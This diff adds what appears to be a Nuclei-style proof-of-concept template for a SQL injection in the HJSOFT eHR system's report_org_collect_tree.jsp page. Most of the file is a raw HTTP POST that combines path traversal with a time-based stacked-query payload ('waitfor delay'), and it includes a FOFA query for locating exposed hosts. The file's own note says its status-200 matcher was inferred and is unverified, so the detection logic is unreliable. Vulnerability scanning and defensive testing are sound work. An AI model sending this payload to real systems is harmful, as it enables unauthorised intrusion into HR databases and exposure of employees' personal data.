@@ -1,0 +1,46 @@
+id: poc-vkf562uls5sfa28a
+info:
+  name: 宏景eHR-report_org_collect_tree.jsp存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vkf562uls5sfa28a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vkf562uls5sfa28a
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+    Cookie: JSESSIONID=C79DED09D8CE46170DEB697EA6999135
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 60
+
+
+    params=&isAction=2&cycle_id=2;waitfor%20delay%20''0:0:5''--%20'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
